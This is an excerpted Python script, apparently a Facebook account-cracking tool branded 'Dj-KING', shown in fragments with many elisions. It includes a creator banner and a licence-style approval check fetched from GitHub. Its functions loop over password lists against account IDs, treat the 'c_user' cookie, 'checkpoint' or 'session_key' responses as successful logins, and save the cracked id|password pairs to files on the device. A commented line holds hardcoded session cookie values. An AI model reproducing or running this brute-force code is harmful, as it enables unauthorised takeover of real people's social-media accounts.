...
\033[1;91m[*] WHATSAPP  >\033[1;32m +8801304683013
\033[1;32m---------------------------Dj-KING---------------------------"""  )
  ...
  os.system(f'xdg-open {tan}://https://www.facebook.com/profile.php?id=100000667784765')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get(f"https://github.com/sabbirvai42/aproved.txt/tree/main").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
\033[1;91m---------------------------Dj-KING---------------------------
\033[1;91m[*] CREATOR   >\033[1;32m DJ
\033[1;91m[*] FACEBOOK  > \033[1;32mSABBIR ISLAM 
\033[1;91m[*] GITHUB    >\033[1;32m SEX-XXX
\033[1;91m[*] VERSION   > \033[1;32m0.1
\033[1;91m[*] WHATSAPP  >\033[1;32m+8801304683013
\033[1;32m---------------------------Dj-KING---------------------------"""  )
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [KING -VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [KING-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/KING-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [KING-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/KING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [KING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [KING-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/KING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
            ...
            # 'cookie': 'datr=C6mXZI2L5Y1KX4-Vgy2LbMaY; sb=C6mXZOX0_ypCBJFnkXjkNieo; dnonce=AWlZqZV25S7clNGu0J1vfFAltK6J4kS-Cvb0R6PYt1ZBzEZ9xSWoQdIDJ11iqrqiurOmSQprvlErX0VA66AfY001; fr=0n2SIa1m89la2Ch7S..Bkl6kN.ev.AAA.0.0.Bkl6kl.AWVuIXCPV_g',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[KING-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[KING-CP] '+idf+' | '+ps+'\033[0;97m')
